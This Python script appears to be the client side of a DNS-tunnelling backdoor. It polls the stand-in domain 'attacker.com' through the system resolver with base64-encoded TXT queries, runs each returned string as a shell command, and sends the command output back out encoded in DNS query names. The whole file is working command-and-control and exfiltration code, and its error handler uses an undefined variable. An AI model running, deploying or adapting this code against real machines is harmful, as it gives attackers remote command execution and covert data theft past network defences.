
import base64
import dnslib
import socket
import time
from enum import Enum
import subprocess

class TunnelMessageType(Enum): 
    PROBE = 1
    ACK = 2
    FILE_START = 3
    FILE_END = 4

def print_status(s: str): 
    print(f"[*] {s}")

class Tunneler: 
    def __init__(self, attacker_domain: str, resolver_ip_addr: str): 
        self.attacker_domain = attacker_domain
        self.resolver_ip_addr = resolver_ip_addr
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def tunnel_text(self, text: str) -> str: 
        self.tunnel(TunnelMessageType.FILE_START.name)
        response = self.tunnel(text)
        self.tunnel(TunnelMessageType.FILE_END.name)
        return response

    def tunnel(self, text: str) -> str: 
        chunked_string = self._chunk_string(text)

        output = ""

        for payload in chunked_string: 
            encoded = base64.urlsafe_b64encode(payload.encode()).decode().strip("=")

            domain = f"{encoded}.{self.attacker_domain}"

            print_status(f"Resolving query {domain}")

            q = dnslib.DNSRecord.question(domain, qtype="TXT")

            self.socket.sendto(q.pack(), (self.resolver_ip_addr, 53))

            response, _ = self.socket.recvfrom(4096)

            reply = dnslib.DNSRecord.parse(response)

            for rr in reply.rr: 
                if rr.rtype == dnslib.QTYPE.TXT: 
                    output += base64.urlsafe_b64decode(str(rr.rdata)).decode()
        return output
        

    def _chunk_string(self, s: str): 
        return [s[i:i+30] for i in range(0, len(s), 30)]

def main(): 
    resolver_ip = ""
    with open("/etc/resolv.conf") as f: 
        for line in f: 
            if line.strip().startswith("nameserver"): 
                resolver_ip = line.split()[1]

    tunneler = Tunneler("attacker.com", resolver_ip)
    while True: 
        time.sleep(0.1)

        response = tunneler.tunnel(TunnelMessageType.PROBE.name)
        print_status(response)

        if response == TunnelMessageType.ACK.name: 
            continue
        else: 
            try: 
                result = subprocess.run(
                    response,
                    capture_output=True,
                    text=True,
                    shell=True
                )
                if result.stdout: 
                    tunneler.tunnel_text(result.stdout)
                if result.stderr: 
                    tunneler.tunnel_text(result.stderr)
            except Exception: 
                tunneler.tunnel_text(f"Could not run command: {command}")

if __name__ == "__main__": 
    try: 
        main()
    except KeyboardInterrupt: 
        pass




